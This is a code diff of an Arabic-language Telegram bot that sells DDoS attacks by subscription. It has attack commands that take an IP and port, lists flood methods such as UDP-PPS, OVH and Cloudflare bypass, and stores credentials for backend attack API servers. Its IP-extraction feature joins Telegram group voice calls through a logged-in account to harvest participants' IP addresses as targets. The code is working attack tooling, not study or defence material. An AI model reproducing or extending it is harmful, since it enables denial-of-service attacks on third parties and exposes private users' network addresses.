+        "🌐 أرسل الـ API الجديد بالشكل التالي:\n`رابط_الـapi اسم_المستخدم"
+        " كلمة_المرور`\n\nمثال:\n`http://site.com:5001/api/attack USER PASS`",
+        parse_mode="Markdown",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "show_apis":
+    if not is_admin(user_id):
+      return
+    t = f"📋 **قائمة الـ APIs المتاحة ({len(api_servers)}):**\n\n"
+    for idx, srv in enumerate(api_servers, 1):
+      t += (
+          f"{idx}. رابط: `{srv['url']}`\nمستخدم: `{srv['username']}`\nكلمة المرور:"
+          f" `{srv['password']}`\n------------------------\n"
+      )
+    bot.send_message(chat_id, t, parse_mode="Markdown")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "add_public_telethon":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_public_phone"}
+    bot.send_message(
+        chat_id,
+        "📱 إضافة حساب عام جديد:\n\nأرسل رقم الهاتف مع الرمز الدولي (مثال:"
+        " +9647xxxxxxxxx):",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_fsub_menu":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton(
+            "➕ إضافة قناة اشتراك إجباري", callback_data="add_fsub"
+        ),
+        InlineKeyboardButton(
+            "❌ حذف قناة اشتراك إجباري", callback_data="del_fsub"
+        ),
+        InlineKeyboardButton(
+            "📺 عرض قنوات الاشتراك الإجباري", callback_data="show_fsub"
+        ),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "📢 إدارة الاشتراك الإجباري:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "add_fsub":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_add_fsub"}
+    bot.send_message(chat_id, "📢 أرسل معرف القناة مسبوقاً بـ @ (مثال: @mychannel):")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "del_fsub":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_del_fsub"}
+    bot.send_message(
+        chat_id, "🗑️ أرسل معرف القناة المراد حذفها من الاشتراك الإجباري:"
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "show_fsub":
+    if not is_admin(user_id):
+      return
+    if not mandatory_channels:
+      bot.send_message(chat_id, "📭 لا توجد قنوات مفعلة للاشتراك الإجباري.")
+    else:
+      bot.send_message(
+          chat_id,
+          "📢 قنوات الاشتراك الإجباري:\n\n" + "\n".join(mandatory_channels),
+      )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "set_gif":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_gif"}
+    bot.send_message(chat_id, "🎬 أرسل صورة متحركة GIF الآن:")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_tut_menu":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton(
+            "🎥 تعيين شرح آيفون", callback_data="set_iphone"
+        ),
+        InlineKeyboardButton(
+            "🎥 تعيين شرح أندرويد", callback_data="set_android"
+        ),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "🎥 إدارة فيديوهات الشروحات:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data in ["set_iphone", "set_android"]:
+    if not is_admin(user_id):
+      return
+    target_os = "iphone" if call.data == "set_iphone" else "android"
+    user_states[user_id] = {"state": "waiting_tut_video", "os": target_os}
+    bot.send_message(chat_id, f"🎥 أرسل فيديو لشرح ({target_os.upper()}):")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "back_home":
+    bot.delete_message(chat_id, call.message.message_id)
+
+    class FakeMsg:
+
+      def __init__(self, uid, cid):
+        self.from_user = type("obj", (object,), {"id": uid, "first_name": "صديقي"})
+        self.chat = type("obj", (object,), {"id": cid, "type": "private"})
+        self.text = "/start"
+
+    start_cmd(FakeMsg(user_id, chat_id))
+    bot.answer_callback_query(call.id)
+    return
+
+  elif call.data == "referral_info":
+    bot.answer_callback_query(call.id)
+    bot_info = bot.get_me()
+    bot_username = bot_info.username
+    ref_link = f"https://t.me/{bot_username}?start={user_id}"
+
+    top_text = "🏆 قائمة توب 10 للمشاركين بروابط الإحالة:\n\n"
+    sorted_refs = sorted(
+        user_referrals.items(), key=lambda x: len(x[1]), reverse=True
+    )[:10]
+    if not sorted_refs:
+      top_text += "📭 لا يوجد مشاركون حتى الآن.\n\n"
+    else:
+      for idx, (uid, refs) in enumerate(sorted_refs, 1):
+        try:
+          u_info = bot.get_chat(uid)
+          u_name = u_info.first_name or f"مستخدم {uid}"
+        except:
+          u_name = f"مستخدم {uid}"
+        top_text += f"{idx}. {u_name} ⟵ {len(refs)} دعوة\n"
+
+    msg_text = (
+        f"{top_text}\n"
+        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
+        "🔗 رابط الإحالة الخاص بك:\n"
+        f"{ref_link}\n\n"
+        "💡 شارك الرابط مع أصدقائك، وكل شخص يدخل عبر رابطك ويشترك بالقنوات"
+        " سيحصل على +2 محاولات (إذا تجاوزت 20 محاولة ستصبح الزيادة +1 محاولة لكل"
+        " شخص)."
+    )
+    bot.send_message(chat_id, msg_text)
+
+  elif call.data == "strong_attack":
+    if maintenance_mode and not is_admin(user_id):
+      bot.answer_callback_query(
+          call.id, "البوت الان في وضع الصيانه 🔧", show_alert=True
+      )
+      return
+
+    sub_type, _ = check_subscription(user_id)
+    if not is_admin(user_id) and not sub_type:
+      if not free_mode:
+        bot.answer_callback_query(
+            call.id, "الوضع المجاني معطل حالياً!", show_alert=True
+        )
+        return
+      update_user_attempts(user_id)
+      if user_attempts[user_id]["attempts_left"] <= 0:
+        bot.answer_callback_query(
+            call.id,
+            "❌ نفدت محاولاتك اليومية! انتظر حتى يتم تجديدها أو اشترك لفتح"
+            " الهجمات بلا حدود.",
+            show_alert=True,
+        )
         return
 
-    host = context.args[0]
-    port = context.args[1]
-    requested_time = context.args[2]
-    method = context.args[3]
+    user_states[user_id] = {"state": "waiting_strong_attack"}
+    bot.send_message(
+        chat_id,
+        "⚡ الهجوم القوي:\n\nأرسل الآن الـ IP والـ PORT بالشكل"
+        " التالي:\n91.108.9.166 32000",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "classic_attack_info":
+    bot.answer_callback_query(call.id)
+    bot.send_message(
+        chat_id,
+        "💻 طريقة الهجوم الكلاسيكي:\n\nأرسل الأمر في المحادثة بالشكل"
+        " المباشر:\n/attack 91.108.9.166 32000 120 udp-pps\n\nيثبت هذا الأمر المدة"
+        " وطريقة الهجوم بالطريقة التقليدية.",
+    )
+
+  elif call.data == "login_telethon":
+    user_states[user_id] = {"state": "waiting_phone"}
+    bot.send_message(
+        chat_id,
+        "📱 تسجيل دخول تليثون:\n\nأرسل رقم الهاتف مع الرمز الدولي (مثال:"
+        " +9647xxxxxxxxx):",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "cmd_extract_ip":
+    bot.answer_callback_query(call.id)
+    if user_id not in user_telethon_sessions and not public_sessions:
+      bot.send_message(
+          chat_id,
+          "⚠️ يجب عليك تسجيل دخول حساب تليثون أولاً أو توفر حساب عام من المطور!",
+      )
+      return
+
+    ask = bot.send_message(chat_id, "🔗 أرسل رابط الكروب أو القناة:")
+
+    def on_link(m):
+      lnk = m.text.strip()
+      try:
+        bot.delete_message(m.chat.id, ask.message_id)
+      except Exception:
+        pass
+      _run_extract(user_id, chat_id, lnk)
+
+    bot.register_next_step_handler(ask, on_link)
+
+  elif call.data == "show_methods":
+    bot.send_message(
+        chat_id,
+        "❖ ---------------------------------- ❖\n"
+        "1️⃣ udp-pps\n2️⃣ UDP\n3️⃣ OVH\n4️⃣ SUBNET\n5️⃣ HOMEHOLD\n"
+        "6️⃣ GAM\n7️⃣ DISCORD\n8️⃣ TLS\n9️⃣ CLOUDFLARE\n🔟 HTTPSBYPASS\n"
+        "❖ ---------------------------------- ❖",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "toggle_free":
+    if not is_admin(user_id):
+      return
+    free_mode = not free_mode
+    bot.answer_callback_query(
+        call.id, f"تم تغيير وضع الوضع المجاني إلى: {free_mode}"
+    )
+    admin_settings_refresh(chat_id, call.message.message_id, user_id)
+
+  elif call.data == "toggle_maint":
+    if not is_admin(user_id):
+      return
+    maintenance_mode = not maintenance_mode
+    bot.answer_callback_query(
+        call.id, f"تم تغيير وضع الصيانة إلى: {maintenance_mode}"
+    )
+    admin_settings_refresh(chat_id, call.message.message_id, user_id)
+
+  elif call.data == "toggle_alerts":
+    if not is_admin(user_id):
+      return
+    notify_alerts = not notify_alerts
+    bot.answer_callback_query(call.id, f"تنبيهات المطور: {notify_alerts}")
+    admin_settings_refresh(chat_id, call.message.message_id, user_id)
+
+  elif call.data == "edit_limits":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_edit_limits_type"}
+    bot.send_message(
+        chat_id,
+        "⏱️ أرسل اسم الفئة والوقت الجديد بالثواني هكذا:\nfree 60 أو vip 300"
+        " أو normal 120 أو group 60",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_add_sub_menu":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("➕ إضافة مشترك عادي", callback_data="add_normal"),
+        InlineKeyboardButton("⭐ إضافة مشترك VIP", callback_data="add_vip"),
+        InlineKeyboardButton(
+            "🔗 إنشاء رابط اشتراك محدود بالوقت",
+            callback_data="create_sub_link",
+        ),
+        InlineKeyboardButton(
+            "🔙 رجوع لإعدادات المطور", callback_data="admin_settings_menu"
+        ),
+    )
+    bot.edit_message_text(
+        "اختر خيار إضافة الاشتراك:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "create_sub_link":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_create_link_info"}
+    bot.send_message(
+        chat_id,
+        "🔗 أرسل نوع الاشتراك وعدد الأيام لتوليد الرابط (مثال: Normal 30 أو VIP"
+        " 15):",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_subs_mgmt":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton(
+            "📋 عرض قائمة المشتركين", callback_data="show_subs"
+        ),
+        InlineKeyboardButton("❌ حذف مشترك", callback_data="del_sub"),
+        InlineKeyboardButton(
+            "🎁 تعويض مشترك معين", callback_data="comp_one"
+        ),
+        InlineKeyboardButton(
+            "🌐 تعويض جميع المشتركين", callback_data="comp_all"
+        ),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "إدارة المشتركين:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_prot_mgmt":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton(
+            "🛡️ إضافة هدف للحماية", callback_data="add_prot"
+        ),
+        InlineKeyboardButton("🔓 فك الحماية عن هدف", callback_data="del_prot"),
+        InlineKeyboardButton(
+            "👁️ عرض الأهداف المحمية", callback_data="show_prot"
+        ),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "إدارة الحماية:", chat_id, call.message.message_id, reply_markup=markup
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "admin_broadcast_menu":
+    if not is_admin(user_id):
+      return
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton(
+            "📢 إذاعة للخاص فقط", callback_data="bc_private"
+        ),
+        InlineKeyboardButton(
+            "🌐 إذاعة عامة (خاص + جروبات)", callback_data="bc_public"
+        ),
+        InlineKeyboardButton("📊 إحصائيات البوت", callback_data="bot_stats"),
+        InlineKeyboardButton("🔙 رجوع", callback_data="admin_settings_menu"),
+    )
+    bot.edit_message_text(
+        "الإذاعة والإحصائيات:",
+        chat_id,
+        call.message.message_id,
+        reply_markup=markup,
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data in ["add_normal", "add_vip"]:
+    if not is_admin(user_id):
+      return
+    sub_type = "Normal" if call.data == "add_normal" else "VIP"
+    user_states[user_id] = {"state": f"waiting_add_{sub_type}"}
+    bot.send_message(
+        chat_id,
+        "📥 أرسل أيدي المستخدم وعدد الأيام (مثال: 123456789 30):",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "del_sub":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_del"}
+    bot.send_message(chat_id, "🗑️ أرسل الأيدي للحذف:")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "show_subs":
+    if not is_admin(user_id):
+      return
+    if not subscribers:
+      bot.send_message(chat_id, "📭 لا يوجد مشتركين.")
+    else:
+      t = "📋 المشتركين:\n\n"
+      for uid, info in subscribers.items():
+        t += (
+            f"اسم : {info['name']}\nيوزر ⌯ : @{info['username']}\nايدي ⌯ :"
+            f" {uid}\nنوع ⌯ : {info['type']}\nينتهي ⌯ :"
+            f" {info['end'].strftime('%Y-%m-%d')}\n----------------\n"
+        )
+      bot.send_message(chat_id, t)
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "add_prot":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_prot_add"}
+    bot.send_message(
+        chat_id,
+        "🛡️ أرسل الـ IP والـ PORT (مثال: 1.1.1.1 80):",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "del_prot":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_del_prot"}
+    bot.send_message(
+        chat_id,
+        "🔓 أرسل الـ IP والـ PORT لفك الحماية:",
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "show_prot":
+    if not is_admin(user_id):
+      return
+    bot.send_message(
+        chat_id,
+        "🛡️ الأهداف المحمية:\n\n"
+        + (
+            "\n".join([f"{pt}" for pt in protected_targets])
+            if protected_targets
+            else "📭 لا توجد أهداف محمية."
+        ),
+    )
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "bot_stats":
+    if not is_admin(user_id):
+      return
+    stats_msg = (
+        "📊 إحصائيات البوت:\n\n👤 المستخدمين:"
+        f" {len(all_users)}\n⭐ المشتركين: {len(subscribers)}\n🏰 الكروبات"
+        f" المفعلة: {len(allowed_groups)}"
+    )
+    bot.send_message(chat_id, stats_msg)
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "bc_private":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_bc_private"}
+    bot.send_message(chat_id, "📢 أرسل الرسالة للخاص فقط:")
+    bot.answer_callback_query(call.id)
+
+  elif call.data == "bc_public":
+    if not is_admin(user_id):
+      return
+    user_states[user_id] = {"state": "waiting_bc_public"}
+    bot.send_message(chat_id, "🌐 أرسل الرسالة للخاص والمجموعات:")
+    bot.answer_callback_query(call.id)
+
+
+def admin_settings_refresh(chat_id, msg_id, user_id):
+  markup = InlineKeyboardMarkup(row_width=1)
+  free_st = "🟢 مفعل" if free_mode else "🔴 معطل"
+  maint_st = "🟢 مفعل" if maintenance_mode else "🔴 معطل"
+  alert_st = "🔔 مفعل" if notify_alerts else "🔕 معطل"
+
+  markup.add(
+      InlineKeyboardButton(
+          f"🎁 الوضع المجاني ({free_st})", callback_data="toggle_free"
+      ),
+      InlineKeyboardButton(
+          f"🔧 وضع الصيانة ({maint_st})", callback_data="toggle_maint"
+      ),
+      InlineKeyboardButton(
+          f"🔔 جرس التنبيهات ({alert_st})", callback_data="toggle_alerts"
+      ),
+      InlineKeyboardButton(
+          "⏱️ تعديل أوقات الهجمات والحدود", callback_data="edit_limits"
+      ),
+      InlineKeyboardButton(
+          "➕ إضافة مشترك عادي/VIP/رابط", callback_data="admin_add_sub_menu"
+      ),
+      InlineKeyboardButton(
+          "❌ إدارة المشتركين والحذف", callback_data="admin_subs_mgmt"
+      ),
+      InlineKeyboardButton(
+          "🌐 إدارة الـ APIs المتعددة", callback_data="admin_api_mgmt"
+      ),
+      InlineKeyboardButton(
+          "🛡️ إدارة الحماية والأهداف", callback_data="admin_prot_mgmt"
+      ),
+      InlineKeyboardButton(
+          "📢 الإذاعة والإحصائيات", callback_data="admin_broadcast_menu"
+      ),
+      InlineKeyboardButton(
+          "📢 الاشتراك الإجباري", callback_data="admin_fsub_menu"
+      ),
+      InlineKeyboardButton(
+          "📱 إضافة حساب عام (للكل)", callback_data="add_public_telethon"
+      ),
+      InlineKeyboardButton("🎬 تعيين المتحركة GIF", callback_data="set_gif"),
+      InlineKeyboardButton("🎥 تعيين الشروحات", callback_data="admin_tut_menu"),
+      InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"),
+  )
+  try:
+    bot.edit_message_text(
+        "⚙️ لوحة تحكم وإعدادات المطور:",
+        chat_id,
+        msg_id,
+        reply_markup=markup,
+    )
+  except Exception:
+    pass
+
+
+def _run_extract(uid_e, chat_id, group_link):
+  wait_msg = bot.send_message(
+      chat_id,
+      "<blockquote>جاري استخراج IP...\nيرجى الانتظار</blockquote>",
+      parse_mode="HTML",
+  )
+
+  def do_extract():
+    loop = asyncio.new_event_loop()
+    saved_str = user_telethon_sessions.get(uid_e)
+    if not saved_str and public_sessions:
+      saved_str = public_sessions[0]
+
+    client = TelegramClient(StringSession(saved_str or ""), API_ID, API_HASH)
+
+    async def extract():
+      if not client.is_connected():
+        await client.connect()
+      clean = group_link.split("?")[0].split("#")[0].strip().rstrip("/")
+      for prefix in ["https://t.me/", "http://t.me/", "t.me/", "@"]:
+        if clean.lower().startswith(prefix):
+          clean = clean[len(prefix) :]
+          break
+      if "/" in clean and not clean.startswith("+"):
+        clean = clean.split("/")[0]
+
+      if clean.startswith("+"):
+        invite_hash = clean[1:]
+        inv = await client(CheckChatInviteRequest(invite_hash))
+        if isinstance(inv, ChatInviteAlready):
+          entity = inv.chat
+        else:
+          updates = await client(ImportChatInviteRequest(invite_hash))
+          entity = (
+              updates.chats[0]
+              if hasattr(updates, "chats") and updates.chats
+              else None
+          )
+      else:
+        entity = await client.get_entity(clean)
+
+      full = await client(GetFullChannelRequest(entity))
+      call_input = getattr(full.full_chat, "call", None)
+      if not call_input:
+        return None
+
+      ssrc = _random.randint(100000, 999999)
+      result = await client(
+          JoinGroupCallRequest(
+              call=call_input,
+              join_as=InputPeerSelf(),
+              params=DataJSON(
+                  data=_json.dumps({
+                      "ufrag": "xxxx",
+                      "pwd": "xxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+                      "fingerprints": [{
+                          "hash": "sha-256",
+                          "setup": "active",
+                          "fingerprint": (
+                              "00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"
+                          ),
+                      }],
+                      "ssrc": ssrc,
+                      "ssrc-groups": [],
+                  })
+              ),
+              muted=True,
+              video_stopped=True,
+          )
+      )
+
+      ips = []
+      for upd in result.updates:
+        raw = None
+        if hasattr(upd, "params") and hasattr(upd.params, "data"):
+          raw = upd.params.data
+        elif hasattr(upd, "call") and hasattr(
+            getattr(upd, "call", None), "params"
+        ):
+          raw = getattr(upd.call.params, "data", None)
+        if raw:
+          try:
+            for c in (
+                _json.loads(raw).get("transport", {}).get("candidates", [])
+            ):
+              ip = c.get("ip", "")
+              port = c.get("port", "")
+              if ip and port and not ip.startswith("0.") and ":" not in ip:
+                v = f"{ip} {port}"
+                if v not in ips:
+                  ips.append(v)
+          except Exception:
+            pass
+      try:
+        await client(LeaveGroupCallRequest(call=call_input, source=ssrc))
+      except Exception:
+        pass
+      return ips
 
     try:
-        req_time_int = int(requested_time)
-        if req_time_int > allowed_max_time:
-            await update.message.reply_text(
-                f"⚠ **تم تجاوز أقصى وقت مسموح به!**\n"
-                f"أقصى وقت مسموح لك حالياً هو: `{allowed_max_time}` ثانية.",
-                parse_mode="Markdown"
-            )
-            return
-    except ValueError:
-        await update.message.reply_text("⚠️ يرجى إدخال الوقت كأرقام فقط.")
-        return
-
-    await execute_attack_request(context.bot, chat_id, user, host, port, requested_time, method)
-
-# ----------------- معالج الأزرار الشفافة -----------------
-async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global FREE_MODE_ENABLED, FREE_MODE_MAX_TIME, CHANNELS_DB, MAX_TIME_REGULAR, MAX_TIME_VIP
-
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    data = query.data
-
-    if data == "check_subscription":
-        subscribed, missing = await is_user_subscribed(context.bot, user_id)
-        if subscribed:
-            await query.edit_message_text("✅ تم التحقق بنجاح! تم قبول/تسجيل اشتراكك، يمكنك استخدام البوت الآن.")
-        else:
-            reply_markup = get_join_buttons(missing)
-            await query.edit_message_text(
-                "❌ **لم يتم العثور على طلب انضمامك أو اشتراكك!**\n"
-                "تأكد من الضغط على زر القناة وإرسال طلب الانضمام ثم اضغط تحقق مرة أخرى:",
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-        return
-
-    # --- معالجة زر الهجوم القوي ⚡ ---
-    if data == "btn_strong_attack":
-        is_sub, _, _ = check_user_subscription(user_id)
-        if not (is_sub or is_developer(user_id) or FREE_MODE_ENABLED):
-            await query.message.reply_text("❌ هذه الميزة مخصصة للمشتركين أو أثناء تفعيل الوضع المجاني فقط.")
-            return
-
-        now_ts = time.time()
-        if not is_developer(user_id) and user_id in USER_LAST_STRONG_ATTACK:
-            elapsed = now_ts - USER_LAST_STRONG_ATTACK[user_id]
-            if elapsed < STRONG_ATTACK_COOLDOWN_SECONDS:
-                remaining = int(STRONG_ATTACK_COOLDOWN_SECONDS - elapsed)
-                await query.answer(f"⏳ يرجى الانتظار {remaining} ثانية لاستخدام الهجوم القوي مرة أخرى!", show_alert=True)
-                return
-
-        context.user_data["awaiting_strong_attack_target"] = True
-        await query.message.reply_text(
-            "⚡ **إطلاق الهجوم القوي (Layer 4):**\n\n"
-            "أرسل الـ IP والـ Port الآن بالصيغة التالية:\n"
-            "`IP:PORT` (مثال: `1.2.3.4:80`)\n\n"
-            "📌 *سيتم إطلاق أقوى طريقة Layer 4 لمدة 60 ثانية تلقائياً.*",
-            parse_mode="Markdown"
+      results = loop.run_until_complete(extract())
+      try:
+        bot.delete_message(chat_id, wait_msg.message_id)
+      except Exception:
+        pass
+      if results:
+        bot.send_message(
+            chat_id,
+            "\n".join(results),
         )
-        return
+      else:
+        bot.send_message(chat_id, "⚠️ لا توجد مكالمة نشطة حالياً في المجموعة.")
+    except Exception as eg:
+      try:
+        bot.delete_message(chat_id, wait_msg.message_id)
+      except Exception:
+        pass
+      bot.send_message(chat_id, f"❌ حدث خطأ: {eg}")
 
-    if not is_developer(user_id):
-        await query.message.reply_text("🚫 هذه الميزة مخصصة للمطورين فقط.")
-        return
+  threading.Thread(target=do_extract, daemon=True).start()
 
-    if data == "toggle_notif":
-        if user_id in NOTIFICATION_USERS:
-            NOTIFICATION_USERS.remove(user_id)
-            await query.answer("تم إيقاف التنبيهات 🔕", show_alert=True)
-        else:
-            NOTIFICATION_USERS.add(user_id)
-            await query.answer("تم تفعيل التنبيهات 🔔", show_alert=True)
-        await query.edit_message_reply_markup(reply_markup=get_main_keyboard(user_id))
-        return
 
-    elif data == "add_protection":
-        context.user_data["awaiting_prot_add"] = True
-        await query.message.reply_text("أرسل الهدف المراد حمايته بصيغة:\n`IP:PORT` (مثال: `1.1.1.1:80`)", parse_mode="Markdown")
-        return
+@bot.message_handler(
+    content_types=[
+        "text",
+        "photo",
+        "video",
+        "document",
+        "animation",
+        "sticker",
+        "voice",
+    ],
+    func=lambda msg: msg.from_user.id in user_states,
+)
+def handle_admin_inputs(message):
+  global attack_gif_id
 
-    elif data == "show_protected":
-        if not PROTECTED_TARGETS:
-            await query.answer("لا توجد أهداف محمية حالياً.", show_alert=True)
-            return
-        keyboard = []
-        for target in PROTECTED_TARGETS:
-            keyboard.append([InlineKeyboardButton(f"❌ حذف {target}", callback_data=f"del_prot_{target}")])
-        await query.message.reply_text("🛡 **قائمة الأهداف المحمية:**\nاضغط لإزالة الحماية:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
-        return
+  user_id = message.from_user.id
+  state_data = user_states.get(user_id, {})
+  state = state_data.get("state")
+  text_val = message.text.strip() if message.text else ""
 
-    elif data.startswith("del_prot_"):
-        target = data.replace("del_prot_", "")
-        if target in PROTECTED_TARGETS:
-            PROTECTED_TARGETS.remove(target)
-            await query.answer(f"تم إزالة الحماية عن {target} ✅", show_alert=True)
-            await query.message.delete()
-        return
+  if state == "waiting_api_info":
+    try:
+      parts = text_val.split()
+      api_url = parts[0].strip()
+      api_user = parts[1].strip()
+      api_pass = parts[2].strip()
+      api_servers.append(
+          {"url": api_url, "username": api_user, "password": api_pass}
+      )
+      bot.reply_to(message, "✅ تمت إضافة الـ API الجديد بنجاح وانضم للقائمة!")
+    except Exception:
+      bot.reply_to(
+          message,
+          "⚠️ صيغة خطأ! أرسل بالشكل:\n`http://site.com:5001/api/attack USER"
+          " PASS`",
+          parse_mode="Markdown",
+      )
+    del user_states[user_id]
+    return
 
-    if data == "open_admin_panel":
-        await query.message.reply_text("⚙️ **لوحة تحكم المطور:**", reply_markup=get_admin_keyboard())
+  elif state == "waiting_gif" and message.content_type in [
+      "animation",
+      "document",
+  ]:
+    attack_gif_id = (
+        message.animation.file_id
+        if message.animation
+        else message.document.file_id
+    )
+    bot.reply_to(message, "✅ تم حفظ الصورة المتحركة GIF بنجاح.")
+    del user_states[user_id]
+    return
 
-    elif data == "add_dev":
-        context.user_data["awaiting_dev_add"] = True
-        await query.message.reply_text("أرسل أيدي (ID) الشخص لإضافته كمطور:")
+  elif state == "waiting_add_fsub":
+    if text_val.startswith("@"):
+      mandatory_channels.add(text_val)
+      bot.reply_to(message, f"✅ تم إضافة القناة {text_val} للاشتراك الإجباري.")
+    else:
+      bot.reply_to(message, "⚠️ يرجى إرسال المعرف مسبوقاً بـ @")
+    del user_states[user_id]
+    return
 
-    elif data == "del_dev":
-        context.user_data["awaiting_dev_del"] = True
-        await query.message.reply_text("أرسل أيدي (ID) المطور لحذفه:")
+  elif state == "waiting_del_fsub":
+    if text_val in mandatory_channels:
+      mandatory_channels.remove(text_val)
+      bot.reply_to(message, f"✅ تم حذف القناة {text_val}.")
+    else:
+      bot.reply_to(message, "❌ القناة غير موجودة.")
+    del user_states[user_id]
+    return
 
-    elif data == "list_devs":
-        dev_text = "👥 **قائمة المطورين:**\n\n" + "\n".join([f"• `{d}`" for d in DEVELOPERS_LIST])
-        await query.message.reply_text(dev_text, parse_mode="Markdown")
+  elif state == "waiting_create_link_info":
+    try:
+      parts = text_val.split()
+      stype = "VIP" if parts[0].upper() == "VIP" else "Normal"
+      sdays = int(parts[1])
+      code_str = f"sub_{_random.randint(100000, 999999)}"
+      created_sub_codes[code_str] = {"type": stype, "days": sdays}
 
-    elif data == "add_sub_regular":
-        context.user_data["awaiting_sub_add"] = "REGULAR"
-        await query.message.reply_text(
-            "➕ **إضافة مشترك عادي:**\n\n"
-            "أرسل الأيدي والمدة بالصيغة التالية:\n`ID:المدة`\n\n"
-            "أمثلة:\n• لـ 3 أيام: `123456789:3d`\n• لـ 12 ساعة: `123456789:12h`",
-            parse_mode="Markdown"
-        )
+      bot_info = bot.get_me()
+      link_url = f"https://t.me/{bot_info.username}?start={code_str}"
+      bot.reply_to(
+          message,
+          f"✅ تم إنشاء رابط تفعيل اشتراك ({stype}) لمدة {sdays} يوم!\n\n🔗"
+          f" الرابط:\n{link_url}",
+      )
+    except Exception:
+      bot.reply_to(message, "⚠️ صيغة خطأ! أرسل مثل: Normal 30 أو VIP 15")
+    del user_states[user_id]
+    return
 
-    elif data == "add_sub_vip":
-        context.user_data["awaiting_sub_add"] = "VIP"
-        await query.message.reply_text(
-            "⭐ **إضافة مشترك VIP:**\n\n"
-            "أرسل الأيدي والمدة بالصيغة التالية:\n`ID:المدة`\n\n"
-            "أمثلة:\n• لـ 7 أيام: `123456789:7d`\n• لـ 24 ساعة: `123456789:24h`",
-            parse_mode="Markdown"
-        )
+  elif state == "waiting_tut_video" and message.content_type == "video":
+    state_data["video_id"] = message.video.file_id
+    state_data["state"] = "waiting_tut_extra"
+    user_states[user_id] = state_data
+    bot.reply_to(message, "✅ أرسل الآن النص/المستند المرفق مع الفيديو:")
+    return
 
-    elif data == "manage_subscribers":
-        keyboard = [
-            [InlineKeyboardButton("🗑 حذف مشترك", callback_data="btn_delete_sub")],
-            [InlineKeyboardButton(f"⏱ أقصى وقت عادي ({MAX_TIME_REGULAR}s)", callback_data="set_max_regular")],
-            [InlineKeyboardButton(f"⚡ أقصى وقت VIP ({MAX_TIME_VIP}s)", callback_data="set_max_vip")],
-            [InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")]
-        ]
-        if not SUBSCRIBERS_DB:
-            text = "👥 **لوحة المشتركين:**\n\n❌ لا يوجد مشتركين حالياً."
-        else:
-            text = "📋 **قائمة المشتركين الحاليين:**\n\n"
-            now = datetime.now()
-            for s_id, s_info in list(SUBSCRIBERS_DB.items()):
